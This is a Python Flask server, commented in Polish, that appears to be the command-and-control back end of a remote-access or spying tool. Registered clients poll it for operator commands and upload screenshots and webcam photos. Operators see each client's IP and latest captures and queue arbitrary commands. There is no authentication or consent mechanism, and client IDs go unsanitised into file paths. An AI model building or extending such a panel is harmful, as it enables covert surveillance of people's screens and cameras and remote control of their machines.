from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_cors import CORS
import time
import threading
import base64
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

CAMERA_DIR = "camera_shots"
os.makedirs(CAMERA_DIR, exist_ok=True)

SCREENSHOTS_DIR = "screenshots"
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)

# Przechowywanie klientów
clients = {}
client_lock = threading.Lock()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/upload_camera', methods=['POST'])
def upload_camera():
    """Endpoint do uploadu zdjęć z kamery"""
    try:
        client_id = request.form.get('id')
        if not client_id:
            return jsonify({'success': False, 'error': 'missing_id'})
        
        if 'camera' not in request.files:
            return jsonify({'success': False, 'error': 'no_file'})
        
        file = request.files['camera']
        
        if file.filename == '':
            return jsonify({'success': False, 'error': 'empty_file'})
        
        # Zapisz zdjęcie z kamery
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"camera_{client_id}_{timestamp}.jpg"
        filepath = os.path.join(CAMERA_DIR, filename)
        
        # Zapisz plik
        file.save(filepath)
        
        # Zaktualizuj dane klienta
        with client_lock:
            if client_id in clients:
                clients[client_id]['last_camera'] = filename
                clients[client_id]['last_camera_time'] = time.time()
        
        print(f"📷 Zdjęcie z kamery otrzymane od klienta {client_id}")
        return jsonify({'success': True, 'filename': filename})
        
    except Exception as e:
        print(f"❌ Błąd uploadu zdjęcia z kamery: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get_camera/<client_id>')
def get_camera(client_id):
    """Pobierz najnowsze zdjęcie z kamery klienta"""
    try:
        with client_lock:
            if client_id in clients:
                filename = clients[client_id].get('last_camera')
                if filename:
                    filepath = os.path.join(CAMERA_DIR, filename)
                    if os.path.exists(filepath):
                        # Sprawdź czy zdjęcie nie jest starsze niż 5 minut
                        camera_time = clients[client_id].get('last_camera_time', 0)
                        if time.time() - camera_time < 300:  # 5 minut
                            return send_from_directory(CAMERA_DIR, filename)
        
        # Zwróć domyślny obrazek jeśli nie ma zdjęcia z kamery
        return send_from_directory('.', 'no_camera.png', mimetype='image/png')
        
    except Exception as e:
        print(f"❌ Błąd pobierania zdjęcia z kamery: {e}")
        return jsonify({'error': str(e)})

@app.route('/api/get_clients_with_camera')
def get_clients_with_camera():
    """Zwraca listę klientów z informacją o zdjęciach z kamery"""
    with client_lock:
        current_time = time.time()
        client_list = []
        
        for client_id, client_data in clients.items():
            # Czyszczenie nieaktywnych klientów
            if current_time - client_data['last_seen'] > 30:
                continue
            
            has_camera = (
                'last_camera' in client_data and 
                'last_camera_time' in client_data and
                current_time - client_data['last_camera_time'] < 300
            )
            
            has_screenshot = (
                'last_screenshot' in client_data and 
                'last_screenshot_time' in client_data and
                current_time - client_data['last_screenshot_time'] < 300
            )
            
            client_list.append({
                'id': client_id,
                'name': client_data.get('name', 'Klient'),
                'status': 'active' if current_time - client_data['last_seen'] < 10 else 'inactive',
                'ip': client_data.get('ip', '0.0.0.0'),
                'has_screenshot': has_screenshot,
                'has_camera': has_camera,
                'last_screenshot_time': client_data.get('last_screenshot_time'),
                'last_camera_time': client_data.get('last_camera_time')
            })
        
        return jsonify(client_list)

@app.route('/api/upload_screenshot', methods=['POST'])
def upload_screenshot():
    """Endpoint do uploadu screenshotów"""
    try:
        client_id = request.form.get('id')
        if not client_id:
            return jsonify({'success': False, 'error': 'missing_id'})
        
        if 'screenshot' not in request.files:
            return jsonify({'success': False, 'error': 'no_file'})
        
        file = request.files['screenshot']
        
        if file.filename == '':
            return jsonify({'success': False, 'error': 'empty_file'})
        
        # Zapisz screenshot z nazwą zawierającą ID klienta i timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{client_id}_{timestamp}.png"
        filepath = os.path.join(SCREENSHOTS_DIR, filename)
        
        # Zapisz plik
        file.save(filepath)
        
        # Zaktualizuj dane klienta
        with client_lock:
            if client_id in clients:
                clients[client_id]['last_screenshot'] = filename
                clients[client_id]['last_screenshot_time'] = time.time()
        
        print(f"📸 Screenshot otrzymany od klienta {client_id}")
        return jsonify({'success': True, 'filename': filename})
        
    except Exception as e:
        print(f"❌ Błąd uploadu screenshotu: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get_screenshot/<client_id>')
def get_screenshot(client_id):
    """Pobierz najnowszy screenshot klienta"""
    try:
        with client_lock:
            if client_id in clients:
                filename = clients[client_id].get('last_screenshot')
                if filename:
                    filepath = os.path.join(SCREENSHOTS_DIR, filename)
                    if os.path.exists(filepath):
                        # Sprawdź czy screenshot nie jest starszy niż 5 minut
                        screenshot_time = clients[client_id].get('last_screenshot_time', 0)
                        if time.time() - screenshot_time < 300:  # 5 minut
                            return send_from_directory(SCREENSHOTS_DIR, filename)
        
        # Zwróć domyślny obrazek jeśli nie ma screenshotu
        return send_from_directory('.', 'no_screenshot.png', mimetype='image/png')
        
    except Exception as e:
        print(f"❌ Błąd pobierania screenshotu: {e}")
        return jsonify({'error': str(e)})

@app.route('/api/get_clients_with_screenshots')
def get_clients_with_screenshots():
    """Zwraca listę klientów z informacją o screenshotach"""
    with client_lock:
        current_time = time.time()
        client_list = []
        
        for client_id, client_data in clients.items():
            # Czyszczenie nieaktywnych klientów
            if current_time - client_data['last_seen'] > 30:
                continue
            
            has_screenshot = (
                'last_screenshot' in client_data and 
                'last_screenshot_time' in client_data and
                current_time - client_data['last_screenshot_time'] < 300
            )
            
            client_list.append({
                'id': client_id,
                'name': client_data.get('name', 'Klient'),
                'status': 'active' if current_time - client_data['last_seen'] < 10 else 'inactive',
                'ip': client_data.get('ip', '0.0.0.0'),
                'has_screenshot': has_screenshot,
                'last_screenshot_time': client_data.get('last_screenshot_time')
            })
        
        return jsonify(client_list)

@app.route('/api/clients')
def get_clients():
    """Zwraca listę aktywnych klientów"""
    with client_lock:
        # Czyszczenie nieaktywnych klientów (> 30 sekund)
        current_time = time.time()
        inactive_clients = []
        
        for client_id, client_data in clients.items():
            if current_time - client_data['last_seen'] > 30:
                inactive_clients.append(client_id)
        
        for client_id in inactive_clients:
            del clients[client_id]
        
        # Przygotowanie listy klientów
        client_list = []
        for client_id, client_data in clients.items():
            is_active = current_time - client_data['last_seen'] < 10
            client_list.append({
                'id': client_id,
                'name': client_data.get('name', 'Klient'),
                'status': 'active' if is_active else 'inactive',
                'ip': client_data.get('ip', '0.0.0.0')
            })
        
        return jsonify(client_list)

@app.route('/api/register', methods=['POST'])
def register_client():
    try:
        data = request.json or {}
        client_id = data.get('id')
        client_name = data.get('name', 'Klient')

        if not client_id:
            return jsonify({'success': False, 'error': 'missing_id'})

        with client_lock:
            clients[client_id] = {
                'name': client_name,
                'last_seen': time.time(),
                'command': None,
                'command_time': None,
                'ip': request.remote_addr
            }

        print(f"✅ Rejestracja klienta: {client_id}")
        return jsonify({'success': True})

    except Exception as e:
        print(f"❌ Błąd rejestracji: {e}")
        return jsonify({'success': False})

@app.route('/api/get_command', methods=['POST'])
def get_command():
    try:
        data = request.json or {}
        client_id = data.get('id')

        with client_lock:
            if client_id not in clients:
                return jsonify({
                    'registered': False,
                    'error': 'not_registered'
                })

            clients[client_id]['last_seen'] = time.time()

            command = clients[client_id].get('command')
            if command:
                clients[client_id]['command'] = None
                return jsonify({
                    'registered': True,
                    'command': command
                })

        return jsonify({
            'registered': True,
            'command': None
        })

    except Exception as e:
        print(f"❌ Błąd get_command: {e}")
        return jsonify({
            'registered': False,
            'error': 'server_error'
        })

@app.route('/api/send_command', methods=['POST'])
def send_command():
    """Wysłanie komendy do klienta"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        
        with client_lock:
            if client_id in clients:
                clients[client_id]['command'] = command
                clients[client_id]['command_time'] = time.time()
                print(f"📤 Wysłano komendę '{command}' do klienta {client_id}")
                return jsonify({'success': True})
            else:
                return jsonify({'success': False, 'error': 'Client not found'})
    except Exception as e:
        print(f"❌ Błąd wysyłania komendy: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/ping')
def ping():
    return jsonify({
        'status': 'online',
        'clients_count': len(clients),
        'time': time.time()
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)